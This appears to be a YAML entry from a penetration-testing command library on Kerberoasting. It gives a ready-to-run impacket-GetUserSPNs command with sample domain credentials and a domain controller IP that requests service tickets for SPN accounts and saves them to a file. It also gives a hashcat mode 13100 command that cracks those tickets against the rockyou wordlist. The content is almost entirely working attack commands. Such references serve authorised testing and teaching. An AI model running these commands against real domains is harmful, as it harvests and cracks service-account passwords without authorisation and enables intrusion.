---
description: |
  Perform Kerberoasting — request TGS tickets for accounts with SPNs
  and save them for offline cracking with hashcat.

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
    Username: pentuser
    Password: P@ssw0rd123
command: |
  impacket-GetUserSPNs test.local/pentuser:P@ssw0rd123 -dc-ip 10.10.10.1 -request -outputfile tgs.txt

  # Crack with hashcat
  hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
  - LDAP
items:
  - Username
  - Password
techniques:
  - Kerberoasting
network_position:
  - Internal
references:
  - https://github.com/fortra/impacket
---
